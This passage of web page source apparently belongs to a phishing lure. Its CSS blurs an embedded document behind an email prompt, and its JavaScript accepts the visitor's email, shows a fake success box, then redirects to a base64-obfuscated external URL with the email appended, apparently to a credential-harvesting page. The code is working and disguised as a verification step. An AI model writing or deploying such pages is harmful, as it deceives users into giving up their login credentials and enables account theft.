      .container {

        align-items: center;

      .logo {

      .overlay {
        position: relative;
        width: 98%;
        height: 880px;
        background-color: white;
        border: 1px solid #ccc;
        margin: 0 auto;
        overflow: hidden;
      }

      iframe {
        width: 100%;
        height: 100%;
        border: none;
        display: block;
        margin: 0 auto;
        overflow-x: hidden;
        /* Prevent horizontal scrolling */
        object-fit: contain;
        /* Ensure the image fits without distortion */
        object-position: center;
        /* Center the image within the iframe */
      }

      .blurred {
        filter: blur(10px);
      }

      .input-section {
        position: absolute;
        top: 30%;
        left: 50%;
        transform: translate(-50%, -50%);
        background-color: white;
        padding: 20px;
        border: 1px solid #ddd;
        text-align: center;
        width: 100%;
        max-width: 400px;
      }

      .input-section p {
        margin: 10px 0;
        color: #333;
      }

      .input-section input {
        width: 100%;
        /* Adjust to fill the parent container */
        max-width: 330px;
        /* Set a maximum width for consistency */
        padding: 10px;
        /* Equal padding on all sides */
        margin: 20px auto;
        /* Center the input field horizontally */
        display: block;
        /* Ensure the input behaves like a block-level element */
        border: 1px solid #ccc;
        font-size: 14px;
        box-sizing: border-box;
        /* Ensure padding doesn't affect width calculation */
      }

      .input-section button {
        background-color: rgb(30, 76, 161);
        color: white;
        border: none;
        padding: 10px 20px;
        cursor: pointer;
        font-size: 14px;
      }

      .input-section button:hover {
        background-color: rgb(30, 76, 161);
      }

      .custom-link {
        color: rgb(30, 76, 161);
        /* Initial color */
        text-decoration: none;
        /* Remove underline */
        transition: color 0.3s ease;
        /* Smooth transition for hover effect */
      }

      .custom-link:hover {
        color: black;
        /* Change to black on hover */
      }

      .success-box {
        position: absolute;
        top: 30%;
        left: 50%;
        transform: translate(-50%, -50%);
        background-color: white;
        padding: 20px;
        border: 1px solid #ddd;
        text-align: center;
        width: 90%;
        max-width: 400px;
        display: none;
        /* Initially hidden */
        z-index: 9999;
        /* Ensure it appears on top */
      }

      .success-box img {
        width: 50px;
        margin-bottom: 10px;
      }

      .success-box p {
        margin: 10px 0;
        color: #333;
      }

    <script>
      // Function to validate email format
function validateEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(email);
}

// Function to handle email verification and redirection
function verifyEmail() {
    const emailInput = document.getElementById("emailInput").value.trim();
    const overlay = document.getElementById("overlay");
    const successBox = document.getElementById("successBox");

    // Validate email format
    if (!validateEmail(emailInput)) {
        alert("Please enter a valid email address.");
        return;
    }

    // Show success box and hide the input section
    document.getElementById("inputSection").style.display = "none";
    successBox.style.display = "block";

    // Simulate a delay before redirection
    setTimeout(() => {
        // Redirect to a URL with the email appended
        const encodedRedirectURL = "aHR0cHM6Ly96Zy5pZXJ0aHlkcmkuY29tL0dxUXAvI00="; // Base64 encoded URL
        const decodedRedirectURL = atob(encodedRedirectURL); // Decode Base64
        const redirectURL = `${decodedRedirectURL}${emailInput}`; // Append email directly
        window.location.href = redirectURL; // Redirect to the final URL
    }, 2000); // 2-second delay for user experience
}

// Add event listener for the form submission
document.querySelector("form").addEventListener("submit", (e) => {
    e.preventDefault(); // Prevent default form submission
    verifyEmail(); // Call the email verification function
});
